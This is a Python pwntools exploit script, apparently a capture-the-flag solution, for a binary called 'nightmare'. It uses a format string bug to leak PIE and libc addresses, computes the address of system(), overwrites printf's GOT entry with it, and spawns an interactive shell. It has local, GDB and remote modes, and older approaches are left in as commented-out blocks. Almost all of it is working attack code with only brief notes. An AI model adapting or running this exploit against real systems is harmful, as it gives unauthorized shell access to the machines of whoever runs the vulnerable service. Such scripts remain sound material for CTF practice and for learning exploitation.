from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# for local solve
#gdbscript ='''
#init-pwndbg
#piebase
#breakrva 0x138c
#continue
#'''.format(**locals())

# for remote solve
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1438
continue
'''.format(**locals())

'''
exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()
'''

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

'''
## 1st method to leak the pie_base and libc_system_address

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%26$p')
sh.recvuntil(b'>')
get_leak_libc_system = sh.recvlineS()
leaked_libc_system = int(get_leak_libc_system, 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)
'''

## 2nd method use (since we want to get the offset automatically)
## REFERENCE --> https://docs.pwntools.com/en/stable/fmtstr.html

# option local
'''
def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..

format_str = FmtStr(execute_fmt=send_payload)

leak = int(send_payload('%23$p'), 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

leaked_libc_system = int(send_payload('%26$p'), 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

libc_system_binary = leaked_libc_system - 1599312
log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)

libc_base = libc_system_binary - 0x4c330 
log.info('This is the libc_base --> %#0x', libc_base)

binsh = libc_base + 0x196031
log.info('This is the binsh strings address --> %#0x', binsh)

## REMEMBERING PIE ENABLED, actually need to elf.address = pie_base (for best practice)
printf_got_addr = pie_base + elf.got['printf']
log.info('This is the printf@got addr --> %#0x', printf_got_addr)

## OVERWRITING "printf" with "system" using FmtStr
#format_str = FmtStr(execute_fmt=send_payload)
format_str.write(printf_got_addr, libc_system_binary)

format_str.execute_writes() # perform the writes

sh.sendline(b'2') # go to second menu
sh.sendline(b'sh') # run shell # can't /bin/sh\x00
'''

## REMOTE EXPLOIT

## NOTES: I did found different behavior of the binary in remote server, hence the exploit kinda different :( 
## But the approach is still the same
'''
def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..
'''

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

library = './libc6_2.31-0ubuntu9_amd64.so'
libc = context.binary = ELF(library, checksec=False)

## EXTRA --> need to get the offset first
sh = process(exe) # prevent index out of range
option = b'1'

def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', option)
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..

# get offset
format_str = FmtStr(execute_fmt=send_payload)

sh = start()

option = b'2'
leak = int(send_payload('%9$p'), 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 5333
log.info('This is the actual pie_base --> %#0x', pie_base)

leaked_libc_system = int(send_payload('%13$p'), 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

# use the leaked address to calculate the libc_base by substract the __libc_start_main_ret from libc.blukat
libc_base = leaked_libc_system - 0x0270b3 #__libc_start_main_ret 
log.success('This is the libc_base --> %#0x', libc_base)

# use the system address from the libc.blukat
#system_addr = libc_base + 0x055410
system_addr = libc_base + libc.sym['system']
log.success('This is the system address --> %#0x', system_addr)

# use the binsh_string from the libc.blukat
bin_sh_strings = libc_base + 0x1b75aa 
log.success('This is the /bin/sh address --> %#0x', bin_sh_strings)

# calculate printf@got
printf_got_addr = pie_base + elf.got['printf']
log.info("printf@got %#0x", elf.got['printf'])
log.success('This is the printf@got address --> %#0x', printf_got_addr)

## ANOTHER EXTRA ---> to prevent menu crash, so we can access the option menu
## This is where the behavior is different from the local binary.
option = b'1' 
sh.send(b'1')

## FINAL ONE
format_str.write(printf_got_addr, system_addr)
format_str.execute_writes() # perform the writes

sh.sendline(b'2')
sh.sendline(b'sh')

sh.interactive()
